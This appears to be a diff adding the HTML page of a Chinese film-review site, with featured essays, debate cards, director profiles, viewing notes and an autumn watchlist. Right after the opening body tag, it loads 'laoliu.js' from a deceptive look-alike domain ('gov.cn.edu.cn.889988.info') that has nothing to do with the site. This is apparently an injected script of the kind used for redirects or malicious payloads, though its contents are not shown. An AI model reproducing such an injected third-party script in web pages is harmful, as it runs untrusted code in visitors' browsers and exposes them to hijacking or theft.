@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞论理电影网 - 深度影评 · 理性观影 · 秋日片单</title>
+<meta name="description" content="秋霞论理电影网(https://qiuxialunlidianyingwang-h5.github.io)是一个专注于深度影评与理性观影分析的影视平台，提供专业电影解读、导演专题和经典片单推荐。">
+<meta name="keywords" content="秋霞论理电影网, qiuxialunlidianyingwang-h5, 深度影评, 理性观影, 电影分析, 导演专题, 经典片单">
+<meta name="author" content="秋霞论理电影网">
+<meta name="robots" content="index, follow">
+<style>
+/* ================= 全局 ================= */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --autumn-red:#c0392b;
+  --autumn-orange:#e67e22;
+  --autumn-warm:#f5cba7;
+  --autumn-cream:#fdf2e9;
+  --autumn-dark:#3d1c04;
+  --autumn-brown:#6e2c00;
+  --autumn-leaf:#d35400;
+  --text-main:#2c1810;
+  --text-secondary:#7b4a3a;
+  --text-muted:#a0522d;
+  --card-bg:#fffaf5;
+  --shadow:0 4px 20px rgba(192,57,43,0.12);
+  --shadow-lg:0 12px 40px rgba(192,57,43,0.18);
+  --radius:16px;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Source Serif Pro","Noto Serif SC","Songti SC","PingFang SC",serif;
+  background:var(--autumn-cream);
+  color:var(--text-main);
+  line-height:1.8;
+  overflow-x:hidden;
+}
+
+/* ================= 秋叶飘落背景 ================= */
+.autumn-bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;background:var(--autumn-cream)}
+.leaf{
+  position:absolute;top:-40px;width:20px;height:20px;
+  background:var(--autumn-red);clip-path:polygon(50% 0%,0% 100%,100% 100%);
+  opacity:.15;animation:fall linear infinite;
+}
+.leaf:nth-child(1){left:10%;animation-duration:12s;animation-delay:0s;background:var(--autumn-red)}
+.leaf:nth-child(2){left:20%;animation-duration:15s;animation-delay:2s;background:var(--autumn-orange);clip-path:polygon(50% 0%,0% 70%,100% 70%)}
+.leaf:nth-child(3){left:35%;animation-duration:10s;animation-delay:4s;background:var(--autumn-leaf)}
+.leaf:nth-child(4){left:50%;animation-duration:14s;animation-delay:1s;background:var(--autumn-warm)}
+.leaf:nth-child(5){left:65%;animation-duration:11s;animation-delay:3s;background:var(--autumn-red);clip-path:polygon(50% 0%,0% 80%,100% 80%)}
+.leaf:nth-child(6){left:80%;animation-duration:13s;animation-delay:5s;background:var(--autumn-orange)}
+.leaf:nth-child(7){left:90%;animation-duration:9s;animation-delay:2.5s;background:var(--autumn-leaf)}
+@keyframes fall{0%{transform:translateY(0) rotate(0deg)}100%{transform:translateY(110vh) rotate(360deg)}}
+
+/* ================= 顶部导航 ================= */
+.topbar{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(253,242,233,0.92);backdrop-filter:blur(16px);
+  border-bottom:2px solid rgba(192,57,43,0.15);
+}
+.topbar-inner{
+  max-width:1200px;margin:0 auto;padding:0 20px;
+  display:flex;align-items:center;justify-content:space-between;height:60px;
+}
+.brand{display:flex;align-items:center;gap:10px}
+.brand-mark{
+  width:38px;height:38px;border-radius:10px;
+  background:linear-gradient(135deg,var(--autumn-red),var(--autumn-orange));
+  display:flex;align-items:center;justify-content:center;font-size:1.1rem;color:#fff;font-weight:900;
+}
+.brand-name{font-size:1.15rem;font-weight:800;color:var(--autumn-dark);letter-spacing:1px}
+.brand-name span{color:var(--autumn-red)}
+.topnav{display:flex;gap:4px;align-items:center}
+.topnav a{
+  padding:8px 16px;border-radius:8px;font-size:.85rem;font-weight:600;color:var(--text-secondary);
+  transition:all .3s;
+}
+.topnav a:hover,.topnav a.active{background:rgba(192,57,43,0.1);color:var(--autumn-red)}
+.topnav a.active{border-bottom:2px solid var(--autumn-red)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--autumn-dark);cursor:pointer}
+
+/* ================= Hero 杂志封面 ================= */
+.hero-magazine{
+  position:relative;z-index:1;margin-top:60px;padding:70px 20px 60px;
+}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.hero-text h1{
+  font-size:clamp(1.8rem,4vw,3rem);font-weight:900;line-height:1.2;margin-bottom:16px;color:var(--autumn-dark);
+}
+.hero-text h1 .accent{color:var(--autumn-red);font-style:italic}
+.hero-text p{font-size:1rem;color:var(--text-secondary);margin-bottom:28px;line-height:1.7}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn-primary{
+  padding:12px 28px;border-radius:10px;background:linear-gradient(135deg,var(--autumn-red),var(--autumn-orange));
+  color:#fff;font-weight:700;font-size:.9rem;border:none;cursor:pointer;transition:all .3s;font-family:inherit;
+}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:var(--shadow-lg)}
+.btn-ghost{
+  padding:12px 28px;border-radius:10px;border:2px solid var(--autumn-red);color:var(--autumn-red);
+  font-weight:700;font-size:.9rem;background:transparent;cursor:pointer;transition:all .3s;font-family:inherit;
+}
+.btn-ghost:hover{background:rgba(192,57,43,0.05)}
+.hero-cover{
+  position:relative;height:340px;border-radius:20px;overflow:hidden;
+  background:linear-gradient(135deg,var(--autumn-red),var(--autumn-orange),var(--autumn-leaf));
+  display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;text-align:center;
+  box-shadow:var(--shadow-lg);
+}
+.hero-cover::before{
+  content:'';position:absolute;inset:0;
+  background:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.06'%3E%3Cpath d='M30 30L15 15H0v30h15L30 30zm0 0l15-15h15v30H45L30 30z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+}
+.hero-cover .cover-icon{font-size:4rem;margin-bottom:12px;position:relative}
+.hero-cover .cover-title{font-size:1.4rem;font-weight:900;position:relative;letter-spacing:2px}
+.hero-cover .cover-sub{font-size:.8rem;opacity:.8;position:relative;margin-top:6px;font-style:italic}
+
+/* ================= 通用容器 ================= */
+.container{max-width:1200px;margin:0 auto;padding:50px 20px;position:relative;z-index:1}
+.section-label{
+  font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--autumn-orange);
+  font-family:"Courier New",monospace;margin-bottom:6px;font-weight:600;
+}
+.section-title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin-bottom:6px;color:var(--autumn-dark)}
+.section-desc{font-size:.88rem;color:var(--text-secondary);margin-bottom:32px}
+
+/* ================= 栏目1：深度长文（杂志排版） ================= */
+.article-grid{display:grid;grid-template-columns:1.5fr 1fr;gap:24px}
+.article-feature{
+  background:var(--card-bg);border-radius:var(--radius);overflow:hidden;
+  box-shadow:var(--shadow);transition:all .3s;cursor:pointer;
+}
+.article-feature:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg)}
+.article-feature .art-cover{
+  height:240px;background:linear-gradient(135deg,var(--autumn-red),var(--autumn-leaf));
+  display:flex;align-items:center;justify-content:center;font-size:4rem;color:#fff;position:relative;
+}
+.article-feature .art-cover::after{
+  content:'';position:absolute;bottom:0;left:0;right:0;height:60px;
+  background:linear-gradient(transparent,var(--card-bg));
+}
+.article-feature .art-body{padding:24px}
+.article-feature h2{font-size:1.2rem;font-weight:800;margin-bottom:8px;color:var(--autumn-dark)}
+.article-feature p{font-size:.85rem;color:var(--text-secondary);line-height:1.7;margin-bottom:12px}
+.article-feature .art-meta{display:flex;gap:12px;font-size:.72rem;color:var(--text-muted);font-family:"Courier New",monospace}
+.article-list{display:flex;flex-direction:column;gap:14px}
+.article-item{
+  background:var(--card-bg);border-radius:12px;padding:18px;
+  box-shadow:var(--shadow);transition:all .3s;display:flex;gap:14px;align-items:flex-start;
+  border-left:3px solid transparent;
+}
+.article-item:hover{border-left-color:var(--autumn-red);transform:translateX(4px)}
+.article-item .item-num{
+  font-size:1.4rem;font-weight:900;color:rgba(192,57,43,0.2);font-family:"Georgia",serif;flex-shrink:0;line-height:1;
+}
+.article-item h3{font-size:.92rem;font-weight:700;margin-bottom:4px;color:var(--autumn-dark);line-height:1.4}
+.article-item p{font-size:.75rem;color:var(--text-muted);line-height:1.5}
+.article-item .item-tag{
+  display:inline-block;margin-top:6px;padding:2px 8px;border-radius:4px;
+  font-size:.65rem;background:rgba(192,57,43,0.08);color:var(--autumn-red);font-weight:600;
+}
+
+/* ================= 栏目2：理性论理（辩论式卡片） ================= */
+.debate-section{background:rgba(192,57,43,0.04)}
+.debate-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:20px}
+.debate-card{
+  background:var(--card-bg);border-radius:var(--radius);padding:24px;
+  box-shadow:var(--shadow);transition:all .3s;border-top:4px solid var(--autumn-red);
+}
+.debate-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg)}
+.debate-card .debate-topic{font-size:.7rem;color:var(--autumn-orange);font-weight:700;letter-spacing:1px;margin-bottom:6px}
+.debate-card h3{font-size:1rem;font-weight:800;margin-bottom:10px;color:var(--autumn-dark)}
+.debate-card .debate-content{font-size:.82rem;color:var(--text-secondary);line-height:1.7;margin-bottom:14px}
+.debate-card .debate-stance{
+  display:flex;gap:8px;flex-wrap:wrap;
+}
+.debate-card .stance{
+  padding:6px 12px;border-radius:6px;font-size:.72rem;font-weight:600;
+}
+.debate-card .stance.for{background:rgba(39,174,96,0.1);color:#27ae60}
+.debate-card .stance.against{background:rgba(192,57,43,0.1);color:var(--autumn-red)}
+.debate-card .stance.neutral{background:rgba(230,126,34,0.1);color:var(--autumn-orange)}
+
+/* ================= 栏目3：导演专题（圆形头像+时间线） ================= */
+.director-spotlight{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:20px}
+.spotlight-card{
+  background:var(--card-bg);border-radius:var(--radius);padding:24px;text-align:center;
+  box-shadow:var(--shadow);transition:all .35s;cursor:pointer;
+}
+.spotlight-card:hover{transform:translateY(-6px);box-shadow:var(--shadow-lg)}
+.spotlight-avatar{
+  width:80px;height:80px;margin:0 auto 14px;border-radius:50%;
+  background:linear-gradient(135deg,var(--autumn-red),var(--autumn-orange));
+  display:flex;align-items:center;justify-content:center;font-size:2rem;color:#fff;
+  border:3px solid var(--autumn-warm);
+}
+.spotlight-card h3{font-size:1rem;font-weight:800;margin-bottom:2px;color:var(--autumn-dark)}
+.spotlight-card .origin{font-size:.72rem;color:var(--text-muted);font-style:italic;margin-bottom:8px}
+.spotlight-card .bio{font-size:.75rem;color:var(--text-secondary);line-height:1.6;margin-bottom:10px}
+.spotlight-card .film-count{
+  font-size:.7rem;color:var(--autumn-red);font-weight:600;font-family:"Courier New",monospace;
+}
+
+/* ================= 栏目4：观影手账（便签墙） ================= */
+.journal-section{background:rgba(230,126,34,0.04)}
+.journal-wall{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:18px;
+}
+.journal-note{
+  background:var(--card-bg);border-radius:12px;padding:22px;
+  box-shadow:var(--shadow);position:relative;transition:all .3s;
+  border-bottom:3px solid var(--autumn-warm);
+}
+.journal-note:hover{transform:rotate(0.5deg) translateY(-3px)}
+.journal-note .note-date{
+  font-size:.65rem;color:var(--autumn-orange);font-family:"Courier New",monospace;margin-bottom:6px;
+}
+.journal-note h3{font-size:.95rem;font-weight:700;margin-bottom:6px;color:var(--autumn-dark)}
+.journal-note .note-text{font-size:.8rem;color:var(--text-secondary);line-height:1.7;margin-bottom:10px}
+.journal-note .note-rating{display:flex;gap:2px;font-size:.8rem}
+.journal-note .note-rating .star{color:var(--autumn-orange)}
+.journal-note .note-rating .star.empty{color:#ddd}
+
+/* ================= 栏目5：秋日片单（渐变卡片） ================= */
+.season-list{display:flex;flex-direction:column;gap:14px}
+.season-row{
+  display:grid;grid-template-columns:60px 1fr auto;gap:16px;align-items:center;
+  background:var(--card-bg);border-radius:12px;padding:16px 20px;
+  box-shadow:var(--shadow);transition:all .3s;
+}
+.season-row:hover{transform:translateX(6px);box-shadow:var(--shadow-lg)}
+.season-row .season-rank{
+  font-size:1.5rem;font-weight:900;color:var(--autumn-red);font-family:"Georgia",serif;text-align:center;
+}
+.season-row .season-info h3{font-size:.95rem;font-weight:700;margin-bottom:2px;color:var(--autumn-dark)}
+.season-row .season-info p{font-size:.75rem;color:var(--text-muted)}
+.season-row .season-tag{
+  padding:6px 14px;border-radius:20px;font-size:.7rem;font-weight:600;
+  background:linear-gradient(135deg,var(--autumn-red),var(--autumn-orange));color:#fff;white-space:nowrap;
+}
+
+/* ================= Footer ================= */
+.footer{
+  position:relative;z-index:1;background:var(--autumn-dark);color:var(--autumn-warm);
+  padding:48px 20px 24px;margin-top:50px;
+}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:28px}
+.footer-brand .brand{margin-bottom:12px}
+.footer-brand p{font-size:.82rem;color:rgba(245,203,167,0.7);line-height:1.6}
+.footer-col h4{font-size:.9rem;font-weight:800;margin-bottom:12px;color:var(--autumn-warm)}
+.footer-col a{display:block;font-size:.8rem;color:rgba(245,203,167,0.6);padding:3px 0;transition:color .25s}
+.footer-col a:hover{color:var(--autumn-orange)}
+.footer-bottom{
+  padding-top:20px;border-top:1px solid rgba(245,203,167,0.15);
+  text-align:center;font-size:.72rem;color:rgba(245,203,167,0.5);
+}
+.footer-bottom a{color:var(--autumn-orange);font-weight:600}
+
+/* ================= 响应式 ================= */
+@media(max-width:1024px){
+  .hero-inner{grid-template-columns:1fr;gap:30px}
+  .hero-cover{height:220px}
+  .article-grid{grid-template-columns:1fr}
+}
+@media(max-width:768px){
+  .topnav{
+    display:none;position:absolute;top:60px;left:0;right:0;
+    background:rgba(253,242,233,0.96);flex-direction:column;padding:12px 20px;gap:4px;
+    border-bottom:2px solid rgba(192,57,43,0.15);
+  }
+  .topnav.open{display:flex}
+  .topnav a{width:100%;text-align:center;border-radius:8px}
+  .menu-btn{display:block}
+  .hero-magazine{padding:40px 16px 36px}
+  .container{padding:36px 16px}
+  .debate-grid{grid-template-columns:1fr}
+  .director-spotlight{grid-template-columns:repeat(2,1fr)}
+  .journal-wall{grid-template-columns:1fr}
+  .season-row{grid-template-columns:40px 1fr;gap:10px}
+  .season-row .season-tag{grid-column:2;justify-self:start}
+  .footer-grid{grid-template-columns:1fr 1fr;gap:24px}
+}
+@media(max-width:480px){
+  .director-spotlight{grid-template-columns:1fr}
+  .footer-grid{grid-template-columns:1fr}
+  .hero-text h1{font-size:1.5rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 秋叶飘落背景 -->
+<div class="autumn-bg">
+  <div class="leaf"></div><div class="leaf"></div><div class="leaf"></div>
+  <div class="leaf"></div><div class="leaf"></div><div class="leaf"></div><div class="leaf"></div>
+</div>
+
+<!-- ================= 顶部导航 ================= -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">
+      <div class="brand-mark">秋</div>
+      <div class="brand-name">秋霞<span>论理</span></div>
+    </div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#articles">深度长文</a>
+      <a href="#debate">理性论理</a>
+      <a href="#directors">导演专题</a>
+      <a href="#journal">观影手账</a>
+      <a href="#season">秋日片单</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<!-- ================= Hero ================= -->
+<section class="hero-magazine" id="home">
+  <div class="hero-inner">
+    <div class="hero-text">
+      <h1>以<span class="accent">理性</span>之光<br>解读每一帧影像</h1>
+      <p>秋霞论理电影网（qiuxialunlidianyingwang-h5.github.io）是一个专注于深度影评与理性观影分析的影视平台。我们不做快餐式推荐，只提供有温度、有深度的电影解读。</p>
+      <div class="hero-actions">
+        <button class="btn-primary">🍂 开始阅读</button>
+        <button class="btn-ghost">📖 本周精选</button>
+      </div>
+    </div>
+    <div class="hero-cover">
+      <div class="cover-icon">🎞</div>
+      <div class="cover-title">秋霞论理</div>
+      <div class="cover-sub">Vol. 06 · 深度影评季刊</div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 栏目1：深度长文 ================= -->
+<div class="container" id="articles">
+  <div class="section-label">— FEATURE ARTICLES —</div>
+  <h2 class="section-title">深度长文</h2>
+  <p class="section-desc">每一篇都是对电影文本的认真拆解</p>
+  <div class="article-grid">
+    <div class="article-feature">
+      <div class="art-cover">🎭</div>
+      <div class="art-body">
+        <h2>《霸王别姬》：性别、历史与表演的三重镜像</h2>
+        <p>陈凯歌这部作品为何能成为中国电影史上唯一获得戛纳金棕榈的华语片？本文从程蝶衣的角色建构、文革叙事的隐喻结构，以及张国荣表演中的"雌雄同体"美学三个维度进行深度拆解。</p>
+        <div class="art-meta"><span>12 min read</span><span>·</span><span>影评</span><span>·</span><span>华语经典</span></div>
+      </div>
+    </div>
+    <div class="article-list">
+      <div class="article-item">
+        <div class="item-num">01</div>
+        <div><h3>《花样年华》中的空间政治学</h3><p>王家卫如何用狭窄走廊和密闭房间构建欲望的容器。</p><span class="item-tag">空间叙事</span></div>
+      </div>
+      <div class="article-item">
+        <div class="item-num">02</div>
+        <div><h3>昆汀的暴力美学：从《落水狗》到《好莱坞往事》</h3><p>非线性叙事与血浆美学的三十年演变轨迹。</p><span class="item-tag">作者研究</span></div>
+      </div>
+      <div class="article-item">
+        <div class="item-num">03</div>
+        <div><h3>是枝裕和：家庭作为方法论</h3><p>从《幻之光》到《怪物》，日本家庭电影的范式转移。</p><span class="item-tag">日本电影</span></div>
+      </div>
+      <div class="article-item">
+        <div class="item-num">04</div>
+        <div><h3>《奥本海默》的视听辩证法</h3><p>诺兰如何用IMAX胶片呈现"看不见的爆炸"。</p><span class="item-tag">视听分析</span></div>
+      </div>
+      <div class="article-item">
+        <div class="item-num">05</div>
+        <div><h3>韩国现实主义电影的社会批判维度</h3><p>从《寄生虫》到《首尔之春》的政治隐喻谱系。</p><span class="item-tag">社会批判</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= 栏目2：理性论理 ================= -->
+<div class="container debate-section" id="debate">
+  <div class="section-label">— RATIONAL DEBATE —</div>
+  <h2 class="section-title">理性论理</h2>
+  <p class="section-desc">不站队，只讲理——关于电影的多元观点碰撞</p>
+  <div class="debate-grid">
+    <div class="debate-card">
+      <div class="debate-topic">DEBATE #01</div>
+      <h3>《流浪地球2》是否标志着中国科幻电影的成熟？</h3>
+      <div class="debate-content">从工业体系、叙事结构、视觉特效三个维度评估，该片是否真正达到了好莱坞一线科幻大片的制作水准，还是仍存在"重工业外壳+轻工业内核"的结构性缺陷？</div>
+      <div class="debate-stance">
+        <span class="stance for">✓ 工业成熟论</span>
+        <span class="stance against">✗ 叙事短板论</span>
+        <span class="stance neutral">◐ 辩证看待</span>
+      </div>
+    </div>
+    <div class="debate-card">
+      <div class="debate-topic">DEBATE #02</div>
+      <h3>流媒体时代，电影院是否还有存在的必要？</h3>
+      <div class="debate-content">Netflix、Apple TV+等平台不断蚕食院线市场，4K家庭影院体验日益完善。从经济学、社会学和美学三个层面分析"电影院消亡论"是否成立。</div>
+      <div class="debate-stance">
+        <span class="stance for">✓ 影院不可替代</span>
+        <span class="stance against">✗ 终将式微</span>
+        <span class="stance neutral">◐ 共存演化</span>
+      </div>
+    </div>
+    <div class="debate-card">
+      <div class="debate-topic">DEBATE #03</div>
+      <h3>AI 生成影像是否应被纳入"电影"的定义范畴？</h3>
+      <div class="debate-content">当Sora、Midjourney可以生成以假乱真的动态影像，传统电影定义中"摄影"这一核心要素是否需要被重新界定？这对电影本体论意味着什么？</div>
+      <div class="debate-stance">
+        <span class="stance for">✓ 技术进化论</span>
+        <span class="stance against">✗ 本体捍卫论</span>
+        <span class="stance neutral">◐ 重新定义</span>
+      </div>
+    </div>
+    <div class="debate-card">
+      <div class="debate-topic">DEBATE #04</div>
+      <h3>漫威电影是否属于"电影"？</h3>
+      <div class="debate-content">从作者论、类型片传统、视听语言三个角度切入，探讨超级英雄大片是否具备电影艺术的独立审美价值，还是仅仅是工业化娱乐产品。</div>
+      <div class="debate-stance">
+        <span class="stance for">✓ 类型片价值</span>
+        <span class="stance against">✗ 工业产品论</span>
+        <span class="stance neutral">◐ 分层评价</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= 栏目3：导演专题 ================= -->
+<div class="container" id="directors">
+  <div class="section-label">— DIRECTOR SPOTLIGHT —</div>
+  <h2 class="section-title">导演专题</h2>
+  <p class="section-desc">聚焦大师的创作谱系与美学演变</p>
+  <div class="director-spotlight">
+    <div class="spotlight-card">
+      <div class="spotlight-avatar">🎬</div>
+      <h3>安德烈·塔可夫斯基</h3>
+      <div class="origin">苏联 · 1932-1986</div>
+      <div class="bio">诗意电影的巅峰，用长镜头雕刻时间，将电影升华为接近祈祷的仪式。</div>
+      <div class="film-count">7 部完整长片</div>
+    </div>
+    <div class="spotlight-card">
+      <div class="spotlight-avatar">🎨</div>
+      <h3>英格玛·伯格曼</h3>
+      <div class="origin">瑞典 · 1918-2007</div>
+      <div class="bio">灵魂解剖师，在孤岛与封闭空间中追问信仰、死亡与爱的终极命题。</div>
+      <div class="film-count">60+ 部作品</div>
+    </div>
+    <div class="spotlight-card">
+      <div class="spotlight-avatar">🌊</div>
+      <h3>小津安二郎</h3>
+      <div class="origin">日本 · 1903-1963</div>
+      <div class="bio">低机位凝视下的日本家庭变迁，用极简形式抵达最深的情感共振。</div>
+      <div class="film-count">54 部默片+有声</div>
+    </div>
+    <div class="spotlight-card">
+      <div class="spotlight-avatar">🔭</div>
+      <h3>克里斯托弗·诺兰</h3>
+      <div class="origin">英国 · 1970 —</div>
+      <div class="bio">当代最具作者性的商业导演，用IMAX胶片探索时间、记忆与身份的迷宫。</div>
+      <div class="film-count">12 部长片</div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= 栏目4：观影手账 ================= -->
+<div class="container journal-section" id="journal">
+  <div class="section-label">— VIEWING JOURNAL —</div>
+  <h2 class="section-title">观影手账</h2>
+  <p class="section-desc">编辑们的私人观影笔记</p>
+  <div class="journal-wall">
+    <div class="journal-note">
+      <div class="note-date">2024.10.16 · 周三</div>
+      <h3>《完美的日子》（维姆·文德斯）</h3>
+      <div class="note-text">平山的一天从 cassette tape 的翻转开始。这部电影教会我：把厕所擦干净也是一种修行。役所广司的表演几乎是无声的，但每一个微表情都在说话。</div>
+      <div class="note-rating"><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span></div>
+    </div>
+    <div class="journal-note">
+      <div class="note-date">2024.10.14 · 周一</div>
+      <h3>《坠落的审判》（茹斯汀·特里耶）</h3>
+      <div class="note-text">法庭戏的张力不在于"谁是凶手"，而在于婚姻内部不可言说的权力结构。桑德拉·惠勒的表演令人窒息——她不是在演一个角色，她是在承受一种处境。</div>
+      <div class="note-rating"><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star empty">★</span></div>
+    </div>
+    <div class="journal-note">
+      <div class="note-date">2024.10.12 · 周六</div>
+      <h3>《过往人生》（席琳·宋）</h3>
+      <div class="note-text">"如果这是你人生中唯一一次见到他，你会说什么？" 这部电影最残忍的地方在于它不给你一个浪漫的结局，它给你一个真实的结局。</div>
+      <div class="note-rating"><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span></div>
+    </div>
+    <div class="journal-note">
+      <div class="note-date">2024.10.09 · 周三</div>
+      <h3>《利益区域》（乔纳森·格雷泽）</h3>
+      <div class="note-text">最恐怖的电影往往不展示恐怖本身。用家庭生活的"正常"来反衬背后的"异常"，这种克制比任何血浆都更有力量。</div>
+      <div class="note-rating"><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span></div>
+    </div>
+    <div class="journal-note">
+      <div class="note-date">2024.10.06 · 周日</div>
+      <h3>《苍鹭与少年》（宫崎骏）</h3>
+      <div class="note-text">一部给自己的告别信。苍鹭不是反派，它是引路人。真人的成长不是战胜什么，而是学会与不完美和解。</div>
+      <div class="note-rating"><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star empty">★</span></div>
+    </div>
+    <div class="journal-note">
+      <div class="note-date">2024.10.03 · 周四</div>
+      <h3>《美国小说》（Cord Jefferson）</h3>
+      <div class="note-text">用讽刺的方式解构了整个出版行业的种族偏见。结局的meta处理非常聪明——当虚构比现实更"真实"时，谁有资格定义真相？</div>
+      <div class="note-rating"><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star empty">★</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= 栏目5：秋日片单 ================= -->
+<div class="container" id="season">
+  <div class="section-label">— AUTUMN WATCHLIST —</div>
+  <h2 class="section-title">秋日片单</h2>
+  <p class="section-desc">适合在落叶季节慢慢看完的电影</p>
+  <div class="season-list">
+    <div class="season-row">
+      <div class="season-rank">01</div>
+      <div class="season-info"><h3>秋日奏鸣曲</h3><p>英格玛·伯格曼 / 1978 / 瑞典</p></div>
+      <div class="season-tag">家庭 · 钢琴</div>
+    </div>
+    <div class="season-row">
+      <div class="season-rank">02</div>
+      <div class="season-info"><h3>小森林 夏秋篇</h3><p>森淳一 / 2014 / 日本</p></div>
+      <div class="season-tag">美食 · 慢生活</div>
+    </div>
+    <div class="season-row">
+      <div class="season-rank">03</div>
+      <div class="season-info"><h3>当哈利遇到莎莉</h3><p>罗伯·莱纳 / 1989 / 美国</p></div>
+      <div class="season-tag">爱情 · 秋天纽约</div>
+    </div>
+    <div class="season-row">
+      <div class="season-rank">04</div>
+      <div class="season-info"><h3>落叶</h3><p>阿基·考里斯马基 / 2023 / 芬兰</p></div>
+      <div class="season-tag">冷幽默 · 爱情</div>
+    </div>
+    <div class="season-row">
+      <div class="season-rank">05</div>
+      <div class="season-info"><h3>燃烧女子的肖像</h3><p>瑟琳·席安玛 / 2019 / 法国</p></div>
+      <div class="season-tag">女性 · 油画美学</div>
+    </div>
+    <div class="season-row">
+      <div class="season-rank">06</div>
+      <div class="season-info"><h3>海边的曼彻斯特</h3><p>肯尼斯·罗纳根 / 2016 / 美国</p></div>
+      <div class="season-tag">悲伤 · 冬日海岸</div>
+    </div>
+    <div class="season-row">
+      <div class="season-rank">07</div>
+      <div class="season-info"><h3>步履不停</h3><p>是枝裕和 / 2008 / 日本</p></div>
+      <div class="season-tag">家庭 · 夏日回忆</div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= Footer ================= -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <div class="brand"><div class="brand-mark">秋</div><div class="brand-name">秋霞<span>论理</span></div></div>
+        <p>秋霞论理电影网（qiuxialunlidianyingwang-h5.github.io）是一个专注于深度影评与理性观影分析的影视平台，提供专业电影解读、导演专题和经典片单推荐。</p>
+      </div>
+      <div class="footer-col"><h4>阅读</h4><a href="#articles">深度长文</a><a href="#debate">理性论理</a><a href="#journal">观影手账</a><a href="#">往期归档</a></div>
+      <div class="footer-col"><h4>探索</h4><a href="#directors">导演专题</a><a href="#season">秋日片单</a><a href="#">影史年鉴</a><a href="#">专题合集</a></div>
+      <div class="footer-col"><h4>关于</h4><a href="#">关于本站</a><a href="#">投稿指南</a><a href="#">版权声明</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 秋霞论理电影网 (Qiuxia Lunli Movie Network) - 深度影评 · 理性观影 · 秋日片单</p>
+      <p>网站地址：<a href="https://qiuxialunlidianyingwang-h5.github.io">https://qiuxialunlidianyingwang-h5.github.io</a></p>
+      <p style="margin-top:6px;font-size:.68rem;opacity:.6">本站内容仅供学习交流，所有影片信息来自互联网公开数据，如有侵权请联系删除。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+// 移动端菜单
+var menuBtn=document.getElementById('menuBtn');
+var topNav=document.getElementById('topNav');
+menuBtn.addEventListener('click',function(){topNav.classList.toggle('open')});
+topNav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){topNav.classList.remove('open')})});
+
+// 滚动导航高亮
+var sections=document.querySelectorAll('section[id],div[id]');
+window.addEventListener('scroll',function(){
+  var scrollY=window.scrollY+80;
+  sections.forEach(function(sec){
+    var top=sec.offsetTop,height=sec.offsetHeight,id=sec.getAttribute('id');
+    if(scrollY>=top&&scrollY<top+height){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var activeLink=document.querySelector('.topnav a[href="#'+id+'"]');
+      if(activeLink)activeLink.classList.add('active');
+    }
+  });
+});
+</script>
+
+</body>
+</html>
